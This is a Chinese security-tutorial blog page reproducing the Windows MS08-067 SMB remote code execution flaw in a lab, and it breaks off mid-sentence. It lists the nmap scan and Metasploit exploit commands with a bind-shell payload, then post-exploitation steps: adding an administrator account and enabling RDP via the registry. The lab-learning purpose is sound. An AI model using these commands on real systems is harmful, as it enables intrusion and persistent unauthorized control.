@@ -1,0 +1,901 @@
+<!doctype html>
+<html lang="en-us">
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <title>网络安全自学篇五十九Windows漏洞利用之MS08067远程代码执行漏洞复现及shell深度提权 | 开发者问答集锦</title>
+    <meta property="og:title" content="网络安全自学篇五十九Windows漏洞利用之MS08067远程代码执行漏洞复现及shell深度提权 - 开发者问答集锦">
+    <meta property="og:type" content="article">
+        
+    <meta property="article:published_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+        
+    <meta property="article:modified_time" content='2020-09-02T00:00:00&#43;08:00'>
+        
+    <meta name="Keywords" content="">
+    <meta name="description" content="网络安全自学篇五十九Windows漏洞利用之MS08067远程代码执行漏洞复现及shell深度提权">
+        
+    <meta name="author" content="">
+    <meta property="og:url" content="https://zaina.newban.cn/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%87%AA%E5%AD%A6%E7%AF%87%E4%BA%94%E5%8D%81%E4%B9%9Dwindows%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8Bms08067%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Ashell%E6%B7%B1%E5%BA%A6%E6%8F%90%E6%9D%83/">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href='/css/normalize.css'>
+    <link rel="stylesheet" href='/css/style.css'>
+    <script type="text/javascript" src="//cdn.bootcdn.net/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    
+    
+    
+    
+    
+    
+</head>
+
+
+<body>
+    <header id="header" class="clearfix">
+    <div class="container">
+        <div class="col-group">
+            <div class="site-name ">
+                
+                    <a id="logo" href="https://zaina.newban.cn">
+                        开发者问答集锦
+                    </a>
+                
+                
+            </div>
+            <div>
+                <nav id="nav-menu" class="clearfix">
+                    <a class="" href="https://zaina.newban.cn">首页</a>
+                    
+                </nav>
+            </div>
+        </div>
+    </div>
+</header>
+
+    <div id="body">
+        <div class="container">
+            <div class="col-group">
+
+                <div class="col-8" id="main">
+                    
+<div class="res-cons">
+    
+    <article class="post">
+        <header>
+            <h1 class="post-title">网络安全自学篇五十九Windows漏洞利用之MS08067远程代码执行漏洞复现及shell深度提权</h1>
+        </header>
+        <date class="post-meta meta-date">
+            2020年9月2日
+        </date>
+        
+        
+        <div class="post-meta">
+            <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+                    阅读</span></span>
+        </div>
+        
+        
+        <div class="post-content">
+            
+
+<p>这是作者的网络安全自学教程系列，主要是关于安全工具和实践操作的在线笔记，特分享出来与博友们学习，希望您们喜欢，一起进步。前文分享了Windows远程桌面服务漏洞（CVE-2019-0708）复现，利用RDP和Metasploit工具反弹shell。本文将讲解MS08-067远程代码执行漏洞（CVE-2008-4250），它是Windows
+Server服务RPC请求缓冲区溢出漏洞，利用445端口，并通过Metasploit工具获取shell及进行深入的操作。本文是一篇CVE漏洞还原的基础性文章，希望对您有所帮助。</p>
+
+<h3 id="文章目录">文章目录</h3>
+
+<ul>
+<li>一.漏洞描述</li>
+<li>二.环境搭建
+
+<ul>
+<li>1.环境准备</li>
+<li>2.端口详解</li>
+</ul></li>
+<li>三.利用Metasploit复现漏洞</li>
+<li>四.常见错误及漏洞原因分析
+
+<ul>
+<li>1.常见错误</li>
+<li>2.漏洞成因</li>
+</ul></li>
+<li>五.总结</li>
+</ul>
+
+<p>作者作为网络安全的小白，分享一些自学基础教程给大家，主要是关于安全工具和实践操作的在线笔记，希望您们喜欢。同时，更希望您能与我一起操作和进步，后续将深入学习网络安全和系统安全知识并分享相关实验。总之，希望该系列文章对博友有所帮助，写文不易，大神们不喜勿喷，谢谢！如果文章对您有帮助，将是我创作的最大动力，点赞、评论、私聊均可，一起加油喔~</p>
+
+<p>PS：本文参考了安全网站和参考文献中的文章（详见参考文献），并结合自己的经验和实践进行撰写，也推荐大家阅读参考文献。</p>
+
+<p>下载地址：<a href="https://github.com/eastmountyxz/MS08-067-RPC">https://github.com/eastmountyxz/MS08-067-RPC</a><br />
+安全工具：<a href="https://github.com/eastmountyxz/NetworkSecuritySelf-study">https://github.com/eastmountyxz/NetworkSecuritySelf-study</a></p>
+
+<blockquote>
+<p>声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。</p>
+</blockquote>
+
+<p><strong>前文学习：</strong><br />
+[网络安全自学篇] 一.入门笔记之看雪Web安全学习及异或解密示例<br />
+[网络安全自学篇] 二.Chrome浏览器保留密码功能渗透解析及登录加密入门笔记<br />
+[网络安全自学篇] 三.Burp Suite工具安装配置、Proxy基础用法及暴库示例<br />
+[网络安全自学篇] 四.实验吧CTF实战之WEB渗透和隐写术解密<br />
+[网络安全自学篇] 五.IDA Pro反汇编工具初识及逆向工程解密实战<br />
+[网络安全自学篇] 六.OllyDbg动态分析工具基础用法及Crakeme逆向<br />
+[网络安全自学篇] 七.快手视频下载之Chrome浏览器Network分析及Python爬虫探讨<br />
+[网络安全自学篇] 八.Web漏洞及端口扫描之Nmap、ThreatScan和DirBuster工具<br />
+[网络安全自学篇] 九.社会工程学之基础概念、IP获取、IP物理定位、文件属性<br />
+[网络安全自学篇] 十.论文之基于机器学习算法的主机恶意代码<br />
+[网络安全自学篇] 十一.虚拟机VMware+Kali安装入门及Sqlmap基本用法<br />
+[网络安全自学篇] 十二.Wireshark安装入门及抓取网站用户名密码（一）<br />
+[网络安全自学篇] 十三.Wireshark抓包原理（ARP劫持、MAC泛洪）及数据流追踪和图像抓取（二）<br />
+[网络安全自学篇] 十四.Python攻防之基础常识、正则表达式、Web编程和套接字通信（一）<br />
+[网络安全自学篇] 十五.Python攻防之多线程、C段扫描和数据库编程（二）<br />
+[网络安全自学篇] 十六.Python攻防之弱口令、自定义字典生成及网站暴库防护<br />
+[网络安全自学篇] 十七.Python攻防之构建Web目录扫描器及ip代理池（四）<br />
+[网络安全自学篇] 十八.XSS跨站脚本攻击原理及代码攻防演示（一）<br />
+[网络安全自学篇] 十九.Powershell基础入门及常见用法（一）<br />
+[网络安全自学篇] 二十.Powershell基础入门及常见用法（二）<br />
+[网络安全自学篇] 二十一.GeekPwn极客大赛之安全攻防技术总结及ShowTime<br />
+[网络安全自学篇] 二十二.Web渗透之网站信息、域名信息、端口信息、敏感信息及指纹信息收集<br />
+[网络安全自学篇] 二十三.基于机器学习的恶意请求识别及安全领域中的机器学习<br />
+[网络安全自学篇] 二十四.基于机器学习的恶意代码识别及人工智能中的恶意代码检测<br />
+[网络安全自学篇] 二十五.Web安全学习路线及木马、病毒和防御初探<br />
+[网络安全自学篇] 二十六.Shodan搜索引擎详解及Python命令行调用<br />
+[网络安全自学篇] 二十七.Sqlmap基础用法、CTF实战及请求参数设置（一）<br />
+[网络安全自学篇] 二十八.文件上传漏洞和Caidao入门及防御原理（一）<br />
+[网络安全自学篇] 二十九.文件上传漏洞和IIS6.0解析漏洞及防御原理（二）<br />
+[网络安全自学篇] 三十.文件上传漏洞、编辑器漏洞和IIS高版本漏洞及防御（三）<br />
+[网络安全自学篇] 三十一.文件上传漏洞之Upload-labs靶场及CTF题目01-10（四）<br />
+[网络安全自学篇] 三十二.文件上传漏洞之Upload-labs靶场及CTF题目11-20（五）<br />
+[网络安全自学篇] 三十三.文件上传漏洞之绕狗一句话原理和绕过安全狗（六）<br />
+[网络安全自学篇] 三十四.Windows系统漏洞之5次Shift漏洞启动计算机<br />
+[网络安全自学篇] 三十五.恶意代码攻击溯源及恶意样本分析<br />
+[网络安全自学篇] 三十六.WinRAR漏洞复现（CVE-2018-20250）及恶意软件自启动劫持<br />
+[网络安全自学篇] 三十七.Web渗透提高班之hack the box在线靶场注册及入门知识（一）<br />
+[网络安全自学篇] 三十八.hack the box渗透之BurpSuite和Hydra密码爆破及Python加密Post请求（二）<br />
+[网络安全自学篇] 三十九.hack the box渗透之DirBuster扫描路径及Sqlmap高级注入用法（三）<br />
+[网络安全自学篇] 四十.phpMyAdmin 4.8.1后台文件包含漏洞复现及详解（CVE-2018-12613）<br />
+[网络安全自学篇] 四十一.中间人攻击和ARP欺骗原理详解及漏洞还原<br />
+[网络安全自学篇] 四十二.DNS欺骗和钓鱼网站原理详解及漏洞还原<br />
+[网络安全自学篇] 四十三.木马原理详解、远程服务器IPC$漏洞及木马植入实验<br />
+[网络安全自学篇] 四十四.Windows远程桌面服务漏洞（CVE-2019-0708）复现及详解<br />
+[网络安全自学篇] 四十五.病毒详解及批处理病毒制作（自启动、修改密码、定时关机、蓝屏、进程关闭）<br />
+[网络安全自学篇] 四十六.微软证书漏洞CVE-2020-0601 (上)Windows验证机制及可执行文件签名复现<br />
+[网络安全自学篇] 四十七.微软证书漏洞CVE-2020-0601 (下)Windows证书签名及HTTPS网站劫持<br />
+[网络安全自学篇] 四十八.Cracer第八期——(1)安全术语、Web渗透流程、Windows基础、注册表及黑客常用DOS命令<br />
+[网络安全自学篇] 四十九.Procmon软件基本用法及文件进程、注册表查看<br />
+[网络安全自学篇] 五十.虚拟机基础之安装XP系统、文件共享、网络快照设置及Wireshark抓取BBS密码<br />
+[网络安全自学篇] 五十一.恶意样本分析及HGZ木马控制目标服务器<br />
+[网络安全自学篇] 五十二.Windows漏洞利用之栈溢出原理和栈保护GS机制<br />
+[网络安全自学篇] 五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell<br />
+[网络安全自学篇] 五十四.Windows漏洞利用之基于SEH异常处理机制的栈溢出攻击及shell提取<br />
+[网络安全自学篇] 五十五.Windows漏洞利用之构建ROP链绕过DEP并获取Shell<br />
+[网络安全自学篇] 五十六.i春秋老师分享小白渗透之路及Web渗透技术总结<br />
+[网络安全自学篇] 五十七.PE文件逆向之什么是数字签名及Signtool签名工具详解（一）<br />
+[网络安全自学篇] 五十八.Windows漏洞利用之再看CVE-2019-0708及Metasploit反弹shell</p>
+
+<p><strong>前文欣赏：</strong><br />
+[渗透&amp;攻防] 一.从数据库原理学习网络攻防及防止SQL注入<br />
+[渗透&amp;攻防] 二.SQL MAP工具从零解读数据库及基础用法<br />
+[渗透&amp;攻防] 三.数据库之差异备份及Caidao利器<br />
+[渗透&amp;攻防] 四.详解MySQL数据库攻防及Fiddler神器分析数据包</p>
+
+<hr />
+
+<h1 id="一-漏洞描述">一.漏洞描述</h1>
+
+<p><strong>MS08-067漏洞全称是“Windows
+Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC（Remote Procedure
+Call，远程过程调用）请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。</strong></p>
+
+<p>当用户在受影响的系统上收到RPC请求时，该漏洞会允许远程执行代码，攻击者可以在未经身份验证情况下利用此漏洞运行任意代码。同时，该漏洞可以用于蠕虫攻击。它影响了某些旧版本的Windows系统，包括：</p>
+
+<ul>
+<li>Windows 2000</li>
+<li>Windows XP</li>
+<li>Windows Server 2003
+
+<br /></li>
+</ul>
+
+<p><strong>漏洞原理：</strong><br />
+MS08-067漏洞是通过MSRPC over
+SMB通道调用Server程序中的NEtPathCanonicalize函数时触发的。NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote
+Code Execution）。后续部分我将分析该漏洞的CFG流程图及漏洞成因。</p>
+
+<p><a href="https://img.it610.com/image/info8/3094a6606085428ca73626a04e817c45.png"><img src="https://img.it610.com/image/info8/3094a6606085428ca73626a04e817c45.png" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第1张图片" /></a></p>
+
+<blockquote>
+<p>本文参考了很多大佬的文章，再次感谢他们。实验部分是结合自己的实践和经验讲解，如果存在错误或不足之处，也请批评和指正。</p>
+</blockquote>
+
+<hr />
+
+<h1 id="二-环境搭建">二.环境搭建</h1>
+
+<h2 id="1-环境准备">1.环境准备</h2>
+
+<ul>
+<li><strong>受害机</strong> ：Windows XP SP1镜像</li>
+<li><strong>攻击机</strong> ：Kali系统</li>
+</ul>
+
+<p>第一步，在虚拟机中安装Windows XP SP1系统和Kali系统。</p>
+
+<p><a href="https://img.it610.com/image/info8/2eacf05b032c49f2b3228bb4cc35727a.jpg"><img src="https://img.it610.com/image/info8/2eacf05b032c49f2b3228bb4cc35727a.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第2张图片" /></a></p>
+
+<p>第二步，虚拟机两个系统之间能够相互通信。</p>
+
+<ul>
+<li><strong>Kali</strong> ：192.168.44.136</li>
+<li><strong>Win XP</strong> ：192.168.44.135</li>
+</ul>
+
+<p><a href="https://img.it610.com/image/info8/32a038c383cf4ef5b2b97105afdf9a4f.jpg"><img src="https://img.it610.com/image/info8/32a038c383cf4ef5b2b97105afdf9a4f.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第3张图片" /></a></p>
+
+<p>第三步，打开Windows XP系统，确定445端口开启。如下图所示，在Win XP的CMD中输入“netstat -sn”查看端口445是否打开。</p>
+
+<p><a href="https://img.it610.com/image/info8/98e90085563f4ce683e64498196e6419.jpg"><img src="https://img.it610.com/image/info8/98e90085563f4ce683e64498196e6419.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第4张图片" /></a></p>
+
+<p>第四步，关闭Windows XP系统的防火墙。</p>
+
+<p><a href="https://img.it610.com/image/info8/9a35c7ebeef24dfcbabb843dc38d2364.jpg"><img src="https://img.it610.com/image/info8/9a35c7ebeef24dfcbabb843dc38d2364.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第5张图片" /></a></p>
+
+<p>做完这些初始准备之后，我们开始利用Kali系统进行漏洞复现。</p>
+
+<hr />
+
+<h2 id="2-端口详解">2.端口详解</h2>
+
+<p>这里作者补充一些端口的基础知识，更有利于我们进行Web渗透实验。</p>
+
+<p><strong>(1) 端口作用</strong><br />
+我们知道，一台拥有IP地址的主机可以提供许多服务，比如Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎么区分不同的网络服务呢？显然不能只靠IP地址，因为IP地址与网络服务的关系是一对多的关系，实际上是通过“IP地址+端口号”来区分不同的服务的。</p>
+
+<p>需要注意的是，端口并不是一一对应的。比如你的电脑作为客户机访问一台WWW服务器时，WWW服务器使用“80”端口与你的电脑通信，但你的电脑则可能使用“3456”这样的端口。如下图所示：</p>
+
+<p><img src="https://img.it610.com/image/info8/498e415d91934a7d81b16d0000309b02.jpg" alt="在这里插入图片描述" /></p>
+
+<p><strong>(2) 端口的分类</strong><br />
+端口共1-65535号，知名端口范围从0到1023，这些端口号一般固定分配给一些服务，大家尽量不要使用。比如21端口分配给FTP服务，25端号分配给SMTP邮件传输协议服务，80端口分配给HTTP服务，135端口分配给RPC远程过程调用服务等等。</p>
+
+<p>动态端口的范围从1024到65535，这些端口号一般不固定分配给某个服务，也就是说许多服务都可以使用这些端口。只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。比如1024端口就是分配给第一个向系统发出申请的程序，在关闭程序进程后，就会释放所占用的端口号。注意，端口冲突就不能正常工作。</p>
+
+<p>同时，动态端口号也常常被病毒木马程序所利用，如冰河默认连接端口号是7626、WAY 2.4连接端口号是8011、Netspy
+3.0连接端口号是7306、YAI病毒连接端口号是1024等等。</p>
+
+<p><strong>(3) 常见的端口</strong></p>
+
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>含义</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>21</td>
+<td>FTP文件传输协议代理服务器常用端口号</td>
+</tr>
+
+<tr>
+<td>22</td>
+<td>SSH安全登录、SCP文件传输、端口重定向端口号</td>
+</tr>
+
+<tr>
+<td>23</td>
+<td>Telnet远程登录协议代理服务器常用端口号</td>
+</tr>
+
+<tr>
+<td>25</td>
+<td>SMTP Simple Mail Transfer Protocol (E-mail) 端口号（木马Antigen、WinPC等开放该端口）</td>
+</tr>
+
+<tr>
+<td>53</td>
+<td>DNS域名解析服务端口号</td>
+</tr>
+
+<tr>
+<td><sup>80</sup>&frasl;<sub>8080</sub></td>
+<td>HTTP协议代理服务器常用端口号</td>
+</tr>
+
+<tr>
+<td>110</td>
+<td>POP3“邮局协议版本3”使用的端口号</td>
+</tr>
+
+<tr>
+<td>443</td>
+<td>HTTPS加密的超文本传输服务端口号</td>
+</tr>
+
+<tr>
+<td>445</td>
+<td>通过SMB（服务器信息块）协议，访问各种共享文件夹或共享打印机</td>
+</tr>
+
+<tr>
+<td>1080</td>
+<td>SOCKS代理协议服务器常用端口号</td>
+</tr>
+
+<tr>
+<td>1433</td>
+<td>MSSQL SERVER数据库默认端口号</td>
+</tr>
+
+<tr>
+<td>1521</td>
+<td>Oracle数据库服务端口号</td>
+</tr>
+
+<tr>
+<td>1863</td>
+<td>MSN Messenger的文件传输功能所使用的端口号</td>
+</tr>
+
+<tr>
+<td>3306</td>
+<td>MYSQL默认端口号</td>
+</tr>
+
+<tr>
+<td>3389</td>
+<td>Microsoft RDP微软远程桌面使用的端口号</td>
+</tr>
+
+<tr>
+<td>5631</td>
+<td>Symantec pcAnywhere远程控制数据传输时使用的端口号</td>
+</tr>
+
+<tr>
+<td>5632</td>
+<td>Symantec pcAnywhere 主控端扫描被控端时使用的端口号</td>
+</tr>
+
+<tr>
+<td><sup>4000</sup>&frasl;<sub>8000</sub></td>
+<td>腾讯QQ端口号</td>
+</tr>
+</tbody>
+</table>
+
+<p><strong>(4) 黑客通过端口可以干什么</strong></p>
+
+<ul>
+<li>信息收集</li>
+<li>目标探测</li>
+<li>服务判断</li>
+<li>系统判断</li>
+<li>角色分析
+
+<br /></li>
+</ul>
+
+<p><strong>(5) 445端口</strong><br />
+谢公子大佬在 “135、137、138、139和445端口”
+文章中介绍过这些端口，它们都是与文件共享和打印机共享有关的端口，而且在这几个端口上经常爆发很严重的漏洞。比如2017年危害全球的永恒之蓝，就是利用的445端口。</p>
+
+<p>本篇文章的445端口就是利用SMB（Server Message
+Block）Windows协议族，用于文件共享、打印共享的服务。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！</p>
+
+<p><strong>总之，公开服务器打开139和445端口是一件非常危险的事情。</strong>
+如果有Guest帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭139和445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。</p>
+
+<hr />
+
+<h1 id="三-利用metasploit复现漏洞">三.利用Metasploit复现漏洞</h1>
+
+<ul>
+<li><strong>攻击机</strong> ：Kali - 192.168.44.136</li>
+<li><strong>受害机</strong> ：Win XP - 192.168.44.135
+
+<br /></li>
+</ul>
+
+<p><strong>第一步，利用Nmap工具扫描端口及确认该漏洞是否存在。</strong></p>
+
+<pre><code>nmap -n -p 445 --script smb-vuln-ms08-067 192.168.44.135 --open
+</code></pre>
+
+<p>nmap漏扫脚本目录为“/usr/share/nmap/script/”，如下图所示，扫描结果为VULNERABLE，表示MS0808-067漏洞存在且可以利用。</p>
+
+<p>或者使用 “nmap -sV -Pn 192.168.44.135”
+查看目标主机开放的端口。目标机开放了135、139、445、1025、5000端口，且目标机系统为Windows
+XP。作为黑客，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。</p>
+
+<pre><code>nmap  -sV -Pn 192.168.44.135
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/a057cf97216e473eb50e3e5af6fba4d6.jpg"><img src="https://img.it610.com/image/info8/a057cf97216e473eb50e3e5af6fba4d6.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第6张图片" /></a></p>
+
+<p><strong>第二步，进入Msfconsole并利用search语句查找漏洞利用模块。</strong><br />
+终端内输入msfconsole打开metasploite命令行客户端，使用search命令查找ms08-067的漏洞利用模块。</p>
+
+<pre><code>msfconsole
+search ms08-067
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/1cef5c340a954f3e9a973ecb8776e2f6.jpg"><img src="https://img.it610.com/image/info8/1cef5c340a954f3e9a973ecb8776e2f6.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第7张图片" /></a></p>
+
+<hr />
+
+<p><strong>第三步，进入漏洞模块，并查看相关的使用说明。</strong><br />
+使用use命令选择我们要使用的利用模块。target设置为系统默认是自动定位，如果需要精确定位，可以show targets查看所有，然后进行选择。</p>
+
+<pre><code>use exploit/windows/smb/ms08_067_netapi
+show options
+show targets
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/b10f55ab1b5347d6a19a0006573426b3.jpg"><img src="https://img.it610.com/image/info8/b10f55ab1b5347d6a19a0006573426b3.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第8张图片" /></a></p>
+
+<p><strong>第四步，设置攻击机、受害机信息。</strong></p>
+
+<pre><code># 目标机ip
+set RHOST 192.168.44.135
+# 端口号
+set RPORT 445
+# 设置payload
+set payload generic/shell_bind_tcp
+# 攻击机ip
+set LHOST 192.168.44.136
+# 设置自动类型
+set target 0
+# 显示配置信息
+show options
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/bc499b5a865c490dacb6b021adbf327a.jpg"><img src="https://img.it610.com/image/info8/bc499b5a865c490dacb6b021adbf327a.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第9张图片" /></a></p>
+
+<p><strong>第五步，运行exploit反弹shell。</strong><br />
+此时我们成功获取了Windows XP系统的Shell，我们调用“ipconfig”查看的IP地址也是目标的“192.168.44.135”。</p>
+
+<pre><code>exploit
+session 1
+ipconfig
+pwd
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/a1034a79787742f9a5b48b97214a6f09.jpg"><img src="https://img.it610.com/image/info8/a1034a79787742f9a5b48b97214a6f09.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第10张图片" /></a></p>
+
+<p>注意：Windows XP SP1系统是中文而不是英文的，需要对ms08_067_netapi_ser2003_zh.rb处理。<br />
+参考：MS08-067 远程执行代码 漏洞复现 - feizianquan</p>
+
+<p><strong>第六步，在目标主机上创建文件夹及文件。</strong></p>
+
+<pre><code>cd ..
+# 创建文件夹
+mkdir hacker
+# 访问目录
+dir
+cd hacker
+# 创建文件并写入内容
+echo eastmount&gt;test.txt
+# 查看目标系统的基本信息
+sysinfo
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/bbe5ab649dd54e1c86294919897856a9.jpg"><img src="https://img.it610.com/image/info8/bbe5ab649dd54e1c86294919897856a9.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第11张图片" /></a></p>
+
+<p>显示结果下图所示：</p>
+
+<p><a href="https://img.it610.com/image/info8/b53aa1872bc942279317dee43cd4fafe.jpg"><img src="https://img.it610.com/image/info8/b53aa1872bc942279317dee43cd4fafe.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第12张图片" /></a></p>
+
+<p><strong>第七步，对目标XP主机进行深度提权。</strong></p>
+
+<pre><code># 增加普通用户
+net user hacker 123456 /add 
+# 提升管理员权限
+net localgroup administrators hacker /add
+</code></pre>
+
+<p>Windows DOM用户常用命令如下：</p>
+
+<ul>
+<li><p><strong>net user abcd 1234 /add</strong><br />
+新建一个用户名为abcd，密码为1234的帐户，默认为user组成员</p></li>
+
+<li><p><strong>net user abcd /del</strong><br />
+将用户名为abcd的用户删除</p></li>
+
+<li><p><strong>net user abcd /active:no</strong><br />
+将用户名为abcd的用户禁用</p></li>
+
+<li><p><strong>net user abcd /active:yes</strong><br />
+激活用户名为abcd的用户</p></li>
+
+<li><p><strong>net user abcd</strong><br />
+查看用户名为abcd的用户的情况</p></li>
+
+<li><p><strong>net localgroup administrators abcd /add</strong><br />
+将abcd账户给予管理员权限</p></li>
+</ul>
+
+<p><a href="https://img.it610.com/image/info8/7c678f895d4d43539e819098426f9ab6.jpg"><img src="https://img.it610.com/image/info8/7c678f895d4d43539e819098426f9ab6.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第13张图片" /></a></p>
+
+<p>此时被攻击的主机新增“hacker”管理员如下图所示：</p>
+
+<p><a href="https://img.it610.com/image/info8/984c48c337f44aef94ed0794646dfaaf.jpg"><img src="https://img.it610.com/image/info8/984c48c337f44aef94ed0794646dfaaf.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第14张图片" /></a></p>
+
+<p><strong>第八步，开启远程连接3389端口并进行远程操作。</strong></p>
+
+<pre><code># 开启远程连接
+echo reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f &gt; C:\WINDOWS\system32\3389.bat &amp;&amp; call 3389.bat
+# 查看网络端口
+netstat -an
+# 远程连接
+rdesktop 192.168.44.135
+</code></pre>
+
+<p>首先查看端口，发现目标主机Windows XP并未开启3389端口。</p>
+
+<p><a href="https://img.it610.com/image/info8/c68773b3bf3241a19a28cdc16a61a94d.jpg"><img src="https://img.it610.com/image/info8/c68773b3bf3241a19a28cdc16a61a94d.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第15张图片" /></a></p>
+
+<p>输入命令开启远程连接端口。</p>
+
+<p><a href="https://img.it610.com/image/info8/62ab9b5fc3c24665ac3a3e381537cd10.jpg"><img src="https://img.it610.com/image/info8/62ab9b5fc3c24665ac3a3e381537cd10.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第16张图片" /></a></p>
+
+<p>接着输入“rdesktop 192.168.44.135”连接远程IP地址，并输入我们创建好的hacker用户名及密码。</p>
+
+<p><a href="https://img.it610.com/image/info8/4f5938b36a0f47778f60e97e08bcdeda.jpg"><img src="https://img.it610.com/image/info8/4f5938b36a0f47778f60e97e08bcdeda.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第17张图片" /></a></p>
+
+<p>输入创建的用户名hacker和密码123456回车，弹出提示框点击OK，稍等就会成功远程登录XP系统。</p>
+
+<p><strong>哇塞，是不是很惊讶！这也是本文的深度提权知识。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/68ef018e5f81455ca4770961cb77631a.jpg"><img src="https://img.it610.com/image/info8/68ef018e5f81455ca4770961cb77631a.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第18张图片" /></a></p>
+
+<p>最后，我们还需要将新建的用户名hacker删除。写到这里，整个实验就讲解完毕。</p>
+
+<hr />
+
+<h1 id="四-常见错误及漏洞原因分析">四.常见错误及漏洞原因分析</h1>
+
+<h2 id="1-常见错误">1.常见错误</h2>
+
+<p>我们在运行exploit执行漏洞利用模块时，有时会有相关错误。比如一直提示“exploit completed,but no session was
+created”或“ConnectionRefused the connection was refused by the remote
+host”。需要注意：</p>
+
+<ul>
+<li>Windows XP系统关闭防火墙</li>
+<li>漏洞不稳定多尝试几次</li>
+</ul>
+
+<p><a href="https://img.it610.com/image/info8/ae32ada1ee82465187ee53ee4cc9fb9c.jpg"><img src="https://img.it610.com/image/info8/ae32ada1ee82465187ee53ee4cc9fb9c.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第19张图片" /></a></p>
+
+<p>有时XP系统会提示“Generic Host Process for win32 services”错误。这是svchost.exe错误，内存溢出造成。</p>
+
+<p><a href="https://img.it610.com/image/info8/6637bc857e494907aec74ad05ecce5c5.jpg"><img src="https://img.it610.com/image/info8/6637bc857e494907aec74ad05ecce5c5.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第20张图片" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/4f6da65bbb244c01b5c479c917fad78c.png"><img src="https://img.it610.com/image/info8/4f6da65bbb244c01b5c479c917fad78c.png" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第21张图片" /></a></p>
+
+<p>最终作者解决了XP系统无法提权的问题，在调用“show payloads”设置攻击载荷时，当我采用“set payload
+generic/shell_reverse_tcp”就会报错，最后我将Payload修改为“set payload
